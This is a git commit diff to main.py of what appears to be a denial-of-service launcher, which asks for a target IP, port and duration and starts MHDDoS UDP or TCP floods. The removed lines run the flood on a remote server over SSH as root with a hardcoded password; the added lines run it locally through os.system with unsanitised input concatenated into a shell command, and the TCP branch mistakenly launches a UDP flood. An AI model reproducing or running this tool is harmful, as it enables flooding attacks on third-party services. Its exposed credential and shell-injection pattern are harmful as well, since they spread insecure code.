4749af3ac5d1699f8c8cf2b2553a54fdf6168106
404CoderFound <115412664+404CoderFound@users.noreply.github.com>
2023-03-20 12:37:04 +0100

    Update main.py

--- main.py
+++ main.py
@@ -65,36 +65,39 @@ layer4input = input("""
 if layer4input == "UDP":
     ipudp = input(f"ip ══ ")
     portudp = input(f"port ══ ")
-    
     timeudp = input(f"time ══ ")
-    #cmdudp = "screen && cd files/dont_look && python3 start.py UDP ' + ipudp + ':' + portudp + ' ' + '900' + ' ' + timeudp"
-    host1 = "ssh.surf"
-    username1 = "root"
-    password1 = "gaaBmc87Yw"
-    port1 = 8238
-    client = paramiko.client.SSHClient()
-    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-    client.connect(host1, port=port1, username=username1, password=password1)
-    _stdin, _stdout,_stderr = client.exec_command("cd root && cd MHDDoS && python3 start.py UDP " + ipudp + ":" + portudp + " 900 " + timeudp)
-    print(_stdout.read().decode())
-    time.sleep(5)
-    _stdin.close()
-    client.close()
+
+    #host1 = "ssh.surf"
+    ##username1 = "root"
+    #password1 = "gaaBmc87Yw"
+    #port1 = 8238
+    #client = paramiko.client.SSHClient()
+    #client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    #client.connect(host1, port=port1, username=username1, password=password1)
+    #_stdin, _stdout,_stderr = client.exec_command("cd root && cd MHDDoS && python3 start.py UDP " + ipudp + ":" + portudp + " 900 " + timeudp)
+    #print(_stdout.read().decode())
+    #time.sleep(5)
+    #_stdin.close()
+    #client.close()
+    os.system("cd files/dont_look && python3 start.py UDP" + ipudp + ":" + portudp + " 900 " + timeudp)
 
 if layer4input == "TCP":
     iptcp = input(f"ip ══ ")
     porttcp = input(f"port ══ ")
     threadstcp = input(f"threads ══ ")
     timetcp = input(f"time ══ ")
-    host2 = "ssh.surf"
-    username2 = "root"
-    password2 = "gaaBmc87Yw"
-    port2 = 8238
-    client = paramiko.client.SSHClient()
-    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-    client.connect(host2, port=port2, username=username2, password=password2)
-    _stdin, _stdout,_stderr = client.exec_command("cd root && cd MHDDoS && python3 start.py TCP " + iptcp + ":" + porttcp + " 900 " + timetcp)
-    print(_stdout.read().decode())
-    time.sleep(5)
-    _stdin.close()
-    client.close()
+    
+    
+    #host2 = "ssh.surf"
+    #username2 = "root"
+    #password2 = "gaaBmc87Yw"
+    #port2 = 8238
+    #client = paramiko.client.SSHClient()
+    #client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    #client.connect(host2, port=port2, username=username2, password=password2)
+    #_stdin, _stdout,_stderr = client.exec_command("cd root && cd MHDDoS && python3 start.py TCP " + iptcp + ":" + porttcp + " 900 " + timetcp)
+    #print(_stdout.read().decode())
+    #time.sleep(5)
+    #_stdin.close()
+    #client.close()
+    os.system("cd files/dont_look && python3 start.py UDP" + iptcp + ":" + porttcp + " 900 " + timetcp)
